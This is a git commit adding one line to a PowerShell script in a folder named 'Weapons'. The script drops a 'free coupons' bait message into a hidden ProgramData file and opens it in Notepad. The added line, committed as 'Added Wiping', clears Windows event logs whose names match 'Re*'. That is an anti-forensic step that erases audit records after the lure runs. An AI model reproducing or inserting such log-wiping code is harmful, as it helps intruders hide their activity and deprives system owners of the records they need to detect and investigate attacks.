d9e7847080583ee31cc6d8430582e7fd28120495
Anant Kaul <56610952+anantkaul@users.noreply.github.com>
2022-03-05 04:55:14 +0530

    Added Wiping

--- Weapons/print.ps1
+++ Weapons/print.ps1
@@ -1,3 +1,4 @@
 "You have won 100% free coupons for lifetime ..." > C:\ProgramData\.temp\freecoupon
 "Have Fun !!" >> C:\ProgramData\.temp\freecoupon
 notepad.exe C:\ProgramData\.temp\freecoupon
+Get-EventLog -LogName Re* | ForEach { Clear-EventLog $_.Log }
